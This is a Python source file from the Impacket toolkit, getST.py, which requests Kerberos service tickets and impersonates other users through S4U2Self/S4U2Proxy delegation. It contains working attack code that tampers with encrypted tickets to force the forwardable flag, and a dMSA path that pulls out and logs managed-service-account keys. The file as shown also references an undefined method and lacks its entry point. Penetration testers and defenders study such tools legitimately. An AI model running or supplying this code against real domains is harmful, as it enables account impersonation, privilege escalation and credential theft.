#!/usr/bin/env python3
# Impacket - Collection of Python classes for working with network protocols.
#
# Copyright Fortra, LLC and its affiliated companies
#
# All rights reserved.
#
# This software is provided under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# Description:
#   Given a password, hash, aesKey or TGT in ccache, it will request a Service Ticket and save it as ccache
#   If the account has constrained delegation (with protocol transition) privileges you will be able to use
#   the -impersonate switch to request the ticket on behalf other user (it will use S4U2Self/S4U2Proxy to
#   request the ticket.)
#
#   Similar feature has been implemented already by Benjamin Delpy (@gentilkiwi) in Kekeo (s4u)
#
#   Examples:
#       ./getST.py -hashes lm:nt -spn cifs/contoso-dc contoso.com/user
#
# Authors:
#   Alberto Solino (@agsolino)
#   Charlie Bromberg (@_nwodtuhs)
#   Martin Gallo (@MartinGalloAr)
#   Dirk-jan Mollema (@_dirkjan)
#   Elad Shamir (@elad_shamir)
#   @snovvcrash
#   Leandro (@0xdeaddood)
#   Jake Karnes (@jakekarnes42)

from __future__ import division
from __future__ import print_function
import argparse
import datetime
import logging
import os
import random
import struct
import sys
from binascii import hexlify, unhexlify
from six import ensure_binary

from pyasn1.codec.der import decoder, encoder
from pyasn1.type.univ import noValue
from pyasn1.type import tag

from impacket import version
from impacket.examples import logger
from impacket.examples.utils import parse_identity
from impacket.krb5 import constants, types, crypto, ccache
from impacket.krb5.asn1 import AP_REQ, AS_REP, TGS_REQ, Authenticator, TGS_REP, seq_set, seq_set_iter, PA_FOR_USER_ENC, \
    Ticket as TicketAsn1, EncTGSRepPart, PA_PAC_OPTIONS, EncTicketPart, S4UUserID, PA_S4U_X509_USER, KERB_DMSA_KEY_PACKAGE
from impacket.krb5.ccache import CCache, Credential
from impacket.krb5.crypto import Key, _enctype_table, _HMACMD5, _AES256CTS, Enctype, string_to_key, _get_checksum_profile, Cksumtype
from impacket.krb5.constants import TicketFlags, encodeFlags, ApplicationTagNumbers
from impacket.krb5.kerberosv5 import getKerberosTGS, getKerberosTGT, sendReceive
from impacket.krb5.types import Principal, KerberosTime, Ticket
from impacket.ntlm import compute_nthash
from impacket.winregistry import hexdump


class GETST:
    def __init__(self, target, password, domain, options):
        self.__password = password
        self.__user = target
        self.__domain = domain
        self.__lmhash = ''
        self.__nthash = ''
        self.__aesKey = None
        self.__options = options
        self.__kdcHost = options.dc_ip
        self.__force_forwardable = None
        self.__additional_ticket = None
        self.__dmsa = None
        self.__saveFileName = None
        self.__no_s4u2proxy = None
        if options.hashes is not None:
            self.__lmhash, self.__nthash = options.hashes.split(':')

    def saveTicket(self, ticket, sessionKey):
        ccache = CCache()
        if self.__options.altservice is not None:
            decodedST = decoder.decode(ticket, asn1Spec=TGS_REP())[0]
            sname = decodedST['ticket']['sname']['name-string']
            if len(decodedST['ticket']['sname']['name-string']) == 1:
                logging.debug("Original sname is not formatted as usual (i.e. CLASS/HOSTNAME), automatically filling the substitution service will fail")
                logging.debug("Original sname is: %s" % sname[0])
                if '/' not in self.__options.altservice:
                    raise ValueError("Substitution service must include service class AND name (i.e. CLASS/HOSTNAME@REALM, or CLASS/HOSTNAME)")
                service_class, service_hostname = ('', sname[0])
                service_realm = decodedST['ticket']['realm']
            elif len(decodedST['ticket']['sname']['name-string']) == 2:
                service_class, service_hostname = decodedST['ticket']['sname']['name-string']
                service_realm = decodedST['ticket']['realm']
            else:
                logging.debug("Original sname is: %s" % '/'.join(sname))
                raise ValueError("Original sname is not formatted as usual (i.e. CLASS/HOSTNAME), something's wrong here...")
            if '@' in self.__options.altservice:
                new_service_realm = self.__options.altservice.split('@')[1].upper()
                if not '.' in new_service_realm:
                    logging.debug("New service realm is not FQDN, you may encounter errors")
                if '/' in self.__options.altservice:
                    new_service_hostname = self.__options.altservice.split('@')[0].split('/')[1]
                    new_service_class = self.__options.altservice.split('@')[0].split('/')[0]
                else:
                    logging.debug("No service hostname in new SPN, using the current one (%s)" % service_hostname)
                    new_service_hostname = service_hostname
                    new_service_class = self.__options.altservice.split('@')[0]
            else:
                logging.debug("No service realm in new SPN, using the current one (%s)" % service_realm)
                new_service_realm = service_realm
                if '/' in self.__options.altservice:
                    new_service_hostname = self.__options.altservice.split('/')[1]
                    new_service_class = self.__options.altservice.split('/')[0]
                else:
                    logging.debug("No service hostname in new SPN, using the current one (%s)" % service_hostname)
                    new_service_hostname = service_hostname
                    new_service_class = self.__options.altservice
            if len(service_class) == 0:
                current_service = "%s@%s" % (service_hostname, service_realm)
            else:
                current_service = "%s/%s@%s" % (service_class, service_hostname, service_realm)
            new_service = "%s/%s@%s" % (new_service_class, new_service_hostname, new_service_realm)
            self.__saveFileName += "@" + new_service.replace("/", "_")
            logging.info('Changing service from %s to %s' % (current_service, new_service))
            # the values are changed in the ticket
            decodedST['ticket']['sname']['name-string'][0] = new_service_class
            decodedST['ticket']['sname']['name-string'][1] = new_service_hostname
            decodedST['ticket']['realm'] = new_service_realm
            ticket = encoder.encode(decodedST)
            ccache.fromTGS(ticket, sessionKey, sessionKey)
            # the values need to be changed in the ccache credentials
            # we already checked everything above, we can simply do the second replacement here
            for creds in ccache.credentials:
                creds['server'].fromPrincipal(Principal(new_service, type=constants.PrincipalNameType.NT_PRINCIPAL.value))
        else:
            ccache.fromTGS(ticket, sessionKey, sessionKey)
            creds = ccache.credentials[0]
            service_realm = creds['server'].realm['data']
            service_class = ''
            if len(creds['server'].components) == 2:
                service_class = creds['server'].components[0]['data']
                service_hostname = creds['server'].components[1]['data']
            else:
                service_hostname = creds['server'].components[0]['data']
            if len(service_class) == 0:
                service = "%s@%s" % (service_hostname, service_realm)
            else:
                service = "%s/%s@%s" % (service_class, service_hostname, service_realm)
            self.__saveFileName += "@" + service.replace("/", "_")
        logging.info('Saving ticket in %s' % (self.__saveFileName + '.ccache'))
        ccache.saveFile(self.__saveFileName + '.ccache')

    def doS4U(self, tgt, cipher, oldSessionKey, sessionKey, nthash, aesKey, kdcHost):
        decodedTGT = decoder.decode(tgt, asn1Spec=AS_REP())[0]
        # Extract the ticket from the TGT
        ticket = Ticket()
        ticket.from_asn1(decodedTGT['ticket'])

        apReq = AP_REQ()
        apReq['pvno'] = 5
        apReq['msg-type'] = int(constants.ApplicationTagNumbers.AP_REQ.value)

        opts = list()
        apReq['ap-options'] = constants.encodeFlags(opts)
        seq_set(apReq, 'ticket', ticket.to_asn1)

        authenticator = Authenticator()
        authenticator['authenticator-vno'] = 5
        authenticator['crealm'] = str(decodedTGT['crealm'])

        clientName = Principal()
        clientName.from_asn1(decodedTGT, 'crealm', 'cname')

        seq_set(authenticator, 'cname', clientName.components_to_asn1)

        now = datetime.datetime.now(datetime.timezone.utc)
        authenticator['cusec'] = now.microsecond
        authenticator['ctime'] = KerberosTime.to_asn1(now)

        if logging.getLogger().level == logging.DEBUG:
            logging.debug('AUTHENTICATOR')
            print(authenticator.prettyPrint())
            print('\n')

        encodedAuthenticator = encoder.encode(authenticator)

        # Key Usage 7
        # TGS-REQ PA-TGS-REQ padata AP-REQ Authenticator (includes
        # TGS authenticator subkey), encrypted with the TGS session
        # key (Section 5.5.1)
        encryptedEncodedAuthenticator = cipher.encrypt(sessionKey, 7, encodedAuthenticator, None)

        apReq['authenticator'] = noValue
        apReq['authenticator']['etype'] = cipher.enctype
        apReq['authenticator']['cipher'] = encryptedEncodedAuthenticator

        encodedApReq = encoder.encode(apReq)

        tgsReq = TGS_REQ()

        tgsReq['pvno'] = 5
        tgsReq['msg-type'] = int(constants.ApplicationTagNumbers.TGS_REQ.value)

        tgsReq['padata'] = noValue
        tgsReq['padata'][0] = noValue
        tgsReq['padata'][0]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_TGS_REQ.value)
        tgsReq['padata'][0]['padata-value'] = encodedApReq

        # In the S4U2self KRB_TGS_REQ/KRB_TGS_REP protocol extension, a service
        # requests a service ticket to itself on behalf of a user. The user is
        # identified to the KDC by the user's name and realm.
        clientName = Principal(self.__options.impersonate, type=constants.PrincipalNameType.NT_PRINCIPAL.value)

        S4UByteArray = struct.pack('<I', constants.PrincipalNameType.NT_PRINCIPAL.value)
        S4UByteArray += ensure_binary(self.__options.impersonate) + ensure_binary(self.__domain) + b'Kerberos'

        if logging.getLogger().level == logging.DEBUG:
            logging.debug('S4UByteArray')
            hexdump(S4UByteArray)
        
        paencoded = None
        padatatype = None
        
        if self.__dmsa:
            nonce_value = random.getrandbits(31)
            dmsa_flags = [2, 4] # UNCONDITIONAL_DELEGATION (bit 2) | SIGN_REPLY (bit 4)
            encoded_flags = encodeFlags(dmsa_flags)
            
            s4uID = S4UUserID()
            s4uID.setComponentByName('nonce', nonce_value)
            seq_set(s4uID, 'cname', clientName.components_to_asn1)
            s4uID.setComponentByName('crealm', self.__domain) 
            s4uID.setComponentByName('options', encoded_flags)

            encoded_s4uid = encoder.encode(s4uID)
            checksum_profile = _get_checksum_profile(Cksumtype.SHA1_AES256)
            checkSum = checksum_profile.checksum(
                sessionKey, 
                ApplicationTagNumbers.EncTGSRepPart.value,
                encoded_s4uid
            )
            if logging.getLogger().level == logging.DEBUG:
                logging.debug('CheckSum')
                hexdump(checkSum)
            s4uID_tagged = S4UUserID().subtype(explicitTag=tag.Tag(tag.tagClassContext, tag.tagFormatConstructed, 0))
            s4uID_tagged.setComponentByName('nonce', nonce_value)
            seq_set(s4uID_tagged, 'cname', clientName.components_to_asn1)
            s4uID_tagged.setComponentByName('crealm', self.__domain) 
            s4uID_tagged.setComponentByName('options', encoded_flags)

            pa_s4u_x509_user = PA_S4U_X509_USER()
            pa_s4u_x509_user.setComponentByName('user-id', s4uID_tagged)
            pa_s4u_x509_user['checksum'] = noValue
            pa_s4u_x509_user['checksum']['cksumtype'] = Cksumtype.SHA1_AES256
            pa_s4u_x509_user['checksum']['checksum'] = checkSum

            if logging.getLogger().level == logging.DEBUG:
                logging.debug('Built PA_S4U_X509_USER for DMSA:')
                print(pa_s4u_x509_user.prettyPrint())

            padatatype = int(constants.PreAuthenticationDataTypes.PA_S4U_X509_USER.value)
            paencoded = encoder.encode(pa_s4u_x509_user)
        else:
            # Finally cksum is computed by calling the KERB_CHECKSUM_HMAC_MD5 hash
            # with the following three parameters: the session key of the TGT of
            # the service performing the S4U2Self request, the message type value
            # of 17, and the byte array S4UByteArray.
            checkSum = _HMACMD5.checksum(sessionKey, 17, S4UByteArray)

            if logging.getLogger().level == logging.DEBUG:
                logging.debug('CheckSum')
                hexdump(checkSum)

            paForUserEnc = PA_FOR_USER_ENC()
            seq_set(paForUserEnc, 'userName', clientName.components_to_asn1)
            paForUserEnc['userRealm'] = self.__domain
            paForUserEnc['cksum'] = noValue
            paForUserEnc['cksum']['cksumtype'] = int(constants.ChecksumTypes.hmac_md5.value)
            paForUserEnc['cksum']['checksum'] = checkSum
            paForUserEnc['auth-package'] = 'Kerberos'

            if logging.getLogger().level == logging.DEBUG:
                logging.debug('PA_FOR_USER_ENC')
                print(paForUserEnc.prettyPrint())

            encodedPaForUserEnc = encoder.encode(paForUserEnc)
            padatatype = int(constants.PreAuthenticationDataTypes.PA_FOR_USER.value)
            paencoded = encodedPaForUserEnc

        tgsReq['padata'][1] = noValue
        tgsReq['padata'][1]['padata-type'] = padatatype
        tgsReq['padata'][1]['padata-value'] = paencoded

        reqBody = seq_set(tgsReq, 'req-body')

        opts = list()
        opts.append(constants.KDCOptions.forwardable.value)
        opts.append(constants.KDCOptions.renewable.value)
        opts.append(constants.KDCOptions.canonicalize.value)


        if self.__options.u2u:
            opts.append(constants.KDCOptions.renewable_ok.value)
            opts.append(constants.KDCOptions.enc_tkt_in_skey.value)

        reqBody['kdc-options'] = constants.encodeFlags(opts)

        if self.__no_s4u2proxy and self.__options.spn is not None:
            logging.info("When doing S4U2self only, argument -spn is ignored")

        if self.__dmsa:
            serverName = Principal('krbtgt/%s' % self.__domain, type=constants.PrincipalNameType.NT_SRV_INST.value)
            logging.debug('DMSA: Targeting krbtgt/%s service (sname)' % self.__domain)            
        elif self.__options.u2u:
            serverName = Principal(self.__user, self.__domain.upper(), type=constants.PrincipalNameType.NT_UNKNOWN.value)
        else:
            serverName = Principal(self.__user, type=constants.PrincipalNameType.NT_UNKNOWN.value)

        seq_set(reqBody, 'sname', serverName.components_to_asn1)
        reqBody['realm'] = str(decodedTGT['crealm'])

        now = datetime.datetime.now(datetime.timezone.utc) + datetime.timedelta(days=1)

        reqBody['till'] = KerberosTime.to_asn1(now)
        reqBody['nonce'] = random.getrandbits(31)
        seq_set_iter(reqBody, 'etype',
                     (int(cipher.enctype), int(constants.EncryptionTypes.rc4_hmac.value)))

        if self.__options.u2u:
            seq_set_iter(reqBody, 'additional-tickets', (ticket.to_asn1(TicketAsn1()),))

        if logging.getLogger().level == logging.DEBUG:
            logging.debug('Final TGS')
            print(tgsReq.prettyPrint())

        logging.info('Requesting S4U2self%s' % ('+U2U' if self.__options.u2u else ''))
        message = encoder.encode(tgsReq)

        r = sendReceive(message, self.__domain, kdcHost)

        tgs = decoder.decode(r, asn1Spec=TGS_REP())[0]

        if self.__dmsa:
            try:
                # Decrypt TGS-REP enc-part (Key Usage 8 - TGS_REP_EP_SESSION_KEY)
                cipher = _enctype_table[int(tgs['enc-part']['etype'])]
                plainText = cipher.decrypt(sessionKey, 8, tgs['enc-part']['cipher'])
                encTgsRepPart = decoder.decode(plainText, asn1Spec=EncTGSRepPart())[0]
                
                if logging.getLogger().level == logging.DEBUG:
                    print(encTgsRepPart.prettyPrint())
                
                if 'encrypted_pa_data' not in encTgsRepPart or not encTgsRepPart['encrypted_pa_data']:
                    logging.debug('No encrypted_pa_data found - DMSA key package not present')
                    return
                    
                logging.debug('Found encrypted_pa_data, searching for DMSA key package...')
                
                for padata_entry in encTgsRepPart['encrypted_pa_data']:
                    padata_type = int(padata_entry['padata-type'])
                    logging.debug('Found encrypted padata type: %d (0x%x)' % (padata_type, padata_type))
                    
                    if padata_type == constants.PreAuthenticationDataTypes.KERB_DMSA_KEY_PACKAGE.value:
                        dmsa_key_package = decoder.decode(
                            padata_entry['padata-value'], 
                            asn1Spec=KERB_DMSA_KEY_PACKAGE()
                        )[0]
                        dmsa_key_package.prettyPrint()
                       
                        logging.info('Current keys:')
                        for key in dmsa_key_package['current-keys']:
                            key_type = int(key['keytype'])
                            key_value = bytes(key['keyvalue'])
                            type_name = constants.EncryptionTypes(key_type)
                            hex_key = hexlify(key_value).decode('utf-8')
                            logging.info('%s:%s' % (type_name, hex_key))
                        logging.info('Previous keys:')
                        for key in dmsa_key_package['previous-keys']:
                            key_type = int(key['keytype'])
                            key_value = bytes(key['keyvalue'])
                            type_name = constants.EncryptionTypes(key_type)
                            hex_key = hexlify(key_value).decode('utf-8')
                            logging.info('%s:%s' % (type_name, hex_key))
            
            except Exception as e:
                if logging.getLogger().level == logging.DEBUG:
                    import traceback
                    traceback.print_exc()

        if self.__no_s4u2proxy:
            return r, None, sessionKey, None

        if logging.getLogger().level == logging.DEBUG:
            logging.debug('TGS_REP')
            print(tgs.prettyPrint())

        if self.__force_forwardable:
            # Convert hashes to binary form, just in case we're receiving strings
            if isinstance(nthash, str):
                try:
                    nthash = unhexlify(nthash)
                except TypeError:
                    pass
            if isinstance(aesKey, str):
                try:
                    aesKey = unhexlify(aesKey)
                except TypeError:
                    pass

            # Compute NTHash and AESKey if they're not provided in arguments
            if self.__password != '' and self.__domain != '' and self.__user != '':
                if not nthash:
                    nthash = compute_nthash(self.__password)
                    if logging.getLogger().level == logging.DEBUG:
                        logging.debug('NTHash')
                        print(hexlify(nthash).decode())
                if not aesKey:
                    salt = self.__domain.upper() + self.__user
                    aesKey = _AES256CTS.string_to_key(self.__password, salt, params=None).contents
                    if logging.getLogger().level == logging.DEBUG:
                        logging.debug('AESKey')
                        print(hexlify(aesKey).decode())

            # Get the encrypted ticket returned in the TGS. It's encrypted with one of our keys
            cipherText = tgs['ticket']['enc-part']['cipher']

            # Check which cipher was used to encrypt the ticket. It's not always the same
            # This determines which of our keys we should use for decryption/re-encryption
            newCipher = _enctype_table[int(tgs['ticket']['enc-part']['etype'])]
            if newCipher.enctype == Enctype.RC4:
                key = Key(newCipher.enctype, nthash)
            else:
                key = Key(newCipher.enctype, aesKey)

            # Decrypt and decode the ticket
            # Key Usage 2
            # AS-REP Ticket and TGS-REP Ticket (includes tgs session key or
            #  application session key), encrypted with the service key
            #  (section 5.4.2)
            plainText = newCipher.decrypt(key, 2, cipherText)
            encTicketPart = decoder.decode(plainText, asn1Spec=EncTicketPart())[0]

            # Print the flags in the ticket before modification
            logging.debug('\tService ticket from S4U2self flags: ' + str(encTicketPart['flags']))
            logging.debug('\tService ticket from S4U2self is'
                          + ('' if (encTicketPart['flags'][TicketFlags.forwardable.value] == 1) else ' not')
                          + ' forwardable')

            # Customize flags the forwardable flag is the only one that really matters
            logging.info('\tForcing the service ticket to be forwardable')
            # convert to string of bits
            flagBits = encTicketPart['flags'].asBinary()
            # Set the forwardable flag. Awkward binary string insertion
            flagBits = flagBits[:TicketFlags.forwardable.value] + '1' + flagBits[TicketFlags.forwardable.value + 1:]
            # Overwrite the value with the new bits
            encTicketPart['flags'] = encTicketPart['flags'].clone(value=flagBits)  # Update flags

            logging.debug('\tService ticket flags after modification: ' + str(encTicketPart['flags']))
            logging.debug('\tService ticket now is'
                          + ('' if (encTicketPart['flags'][TicketFlags.forwardable.value] == 1) else ' not')
                          + ' forwardable')

            # Re-encode and re-encrypt the ticket
            # Again, Key Usage 2
            encodedEncTicketPart = encoder.encode(encTicketPart)
            cipherText = newCipher.encrypt(key, 2, encodedEncTicketPart, None)

            # put it back in the TGS
            tgs['ticket']['enc-part']['cipher'] = cipherText

        ################################################################################
        # Up until here was all the S4USelf stuff. Now let's start with S4U2Proxy
        # So here I have a ST for me.. I now want a ST for another service
        # Extract the ticket from the TGT
        ticketTGT = Ticket()
        ticketTGT.from_asn1(decodedTGT['ticket'])

        # Get the service ticket
        ticket = Ticket()
        ticket.from_asn1(tgs['ticket'])

        apReq = AP_REQ()
        apReq['pvno'] = 5
        apReq['msg-type'] = int(constants.ApplicationTagNumbers.AP_REQ.value)

        opts = list()
        apReq['ap-options'] = constants.encodeFlags(opts)
        seq_set(apReq, 'ticket', ticketTGT.to_asn1)

        authenticator = Authenticator()
        authenticator['authenticator-vno'] = 5
        authenticator['crealm'] = str(decodedTGT['crealm'])

        clientName = Principal()
        clientName.from_asn1(decodedTGT, 'crealm', 'cname')

        seq_set(authenticator, 'cname', clientName.components_to_asn1)

        now = datetime.datetime.now(datetime.timezone.utc)
        authenticator['cusec'] = now.microsecond
        authenticator['ctime'] = KerberosTime.to_asn1(now)

        encodedAuthenticator = encoder.encode(authenticator)

        # Key Usage 7
        # TGS-REQ PA-TGS-REQ padata AP-REQ Authenticator (includes
        # TGS authenticator subkey), encrypted with the TGS session
        # key (Section 5.5.1)
        encryptedEncodedAuthenticator = cipher.encrypt(sessionKey, 7, encodedAuthenticator, None)

        apReq['authenticator'] = noValue
        apReq['authenticator']['etype'] = cipher.enctype
        apReq['authenticator']['cipher'] = encryptedEncodedAuthenticator

        encodedApReq = encoder.encode(apReq)

        tgsReq = TGS_REQ()

        tgsReq['pvno'] = 5
        tgsReq['msg-type'] = int(constants.ApplicationTagNumbers.TGS_REQ.value)
        tgsReq['padata'] = noValue
        tgsReq['padata'][0] = noValue
        tgsReq['padata'][0]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_TGS_REQ.value)
        tgsReq['padata'][0]['padata-value'] = encodedApReq

        # Add resource-based constrained delegation support
        paPacOptions = PA_PAC_OPTIONS()
        paPacOptions['flags'] = constants.encodeFlags((constants.PAPacOptions.resource_based_constrained_delegation.value,))

        tgsReq['padata'][1] = noValue
        tgsReq['padata'][1]['padata-type'] = constants.PreAuthenticationDataTypes.PA_PAC_OPTIONS.value
        tgsReq['padata'][1]['padata-value'] = encoder.encode(paPacOptions)

        reqBody = seq_set(tgsReq, 'req-body')

        opts = list()
        # This specified we're doing S4U
        opts.append(constants.KDCOptions.cname_in_addl_tkt.value)
        opts.append(constants.KDCOptions.canonicalize.value)
        opts.append(constants.KDCOptions.forwardable.value)
        opts.append(constants.KDCOptions.renewable.value)

        reqBody['kdc-options'] = constants.encodeFlags(opts)
        service2 = Principal(self.__options.spn, type=constants.PrincipalNameType.NT_SRV_INST.value)
        seq_set(reqBody, 'sname', service2.components_to_asn1)
        reqBody['realm'] = self.__domain

        myTicket = ticket.to_asn1(TicketAsn1())
        seq_set_iter(reqBody, 'additional-tickets', (myTicket,))

        now = datetime.datetime.now(datetime.timezone.utc) + datetime.timedelta(days=1)

        reqBody['till'] = KerberosTime.to_asn1(now)
        reqBody['nonce'] = random.getrandbits(31)
        seq_set_iter(reqBody, 'etype',
                     (
                         int(constants.EncryptionTypes.rc4_hmac.value),
                         int(constants.EncryptionTypes.des3_cbc_sha1_kd.value),
                         int(constants.EncryptionTypes.des_cbc_md5.value),
                         int(cipher.enctype)
                     )
                     )
        message = encoder.encode(tgsReq)

        logging.info('Requesting S4U2Proxy')
        r = sendReceive(message, self.__domain, kdcHost)
        return r, None, sessionKey, None

    def run(self):
        tgt = None

        # Do we have a TGT cached?
        domain, _, TGT, _ = CCache.parseFile(self.__domain)

        # ToDo: Check this TGT belogns to the right principal
        if TGT is not None:
            tgt, cipher, sessionKey = TGT['KDC_REP'], TGT['cipher'], TGT['sessionKey']
            oldSessionKey = sessionKey
            
        if tgt is None:
            # Still no TGT
            userName = Principal(self.__user, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
            logging.info('Getting TGT for user')
            tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(userName, self.__password, self.__domain,
                                                                    unhexlify(self.__lmhash), unhexlify(self.__nthash),
                                                                    self.__aesKey,
                                                                    self.__kdcHost)
            logging.debug("TGT session key: %s" % hexlify(sessionKey.contents).decode())

        # Ok, we have valid TGT, let's try to get a service ticket
        if self.__options.impersonate is None:

            if self.__options.renew is True:
                logging.info("Renewing TGT")

            # Normal TGS interaction
            else:
                logging.info('Getting ST for user')

            serverName = Principal(self.__options.spn, type=constants.PrincipalNameType.NT_SRV_INST.value)
            tgs, cipher, oldSessionKey, sessionKey = getKerberosTGS(serverName, domain, self.__kdcHost, tgt, cipher, sessionKey, self.__options.renew)
            self.__saveFileName = self.__user
        else:
            # Here's the rock'n'roll
            try:
                logging.info('Impersonating %s' % self.__options.impersonate)
                # Editing below to pass hashes for decryption
                if self.__additional_ticket is not None:
                    tgs, cipher, oldSessionKey, sessionKey = self.doS4U2ProxyWithAdditionalTicket(tgt, cipher, oldSessionKey, sessionKey, unhexlify(self.__nthash), self.__aesKey,
                                                                                                  self.__kdcHost, self.__additional_ticket)
                else:
                    tgs, cipher, oldSessionKey, sessionKey = self.doS4U(tgt, cipher, oldSessionKey, sessionKey, unhexlify(self.__nthash), self.__aesKey, self.__kdcHost)
            except Exception as e:
                logging.debug("Exception", exc_info=True)
                logging.error(str(e))
                if str(e).find('KDC_ERR_S_PRINCIPAL_UNKNOWN') >= 0:
                    logging.error('Probably user %s does not have constrained delegation permisions or impersonated user does not exist' % self.__user)
                if str(e).find('KDC_ERR_BADOPTION') >= 0:
                    logging.error('Probably SPN is not allowed to delegate by user %s or initial TGT not forwardable' % self.__user)

                return
            self.__saveFileName = self.__options.impersonate

        self.saveTicket(tgs, oldSessionKey)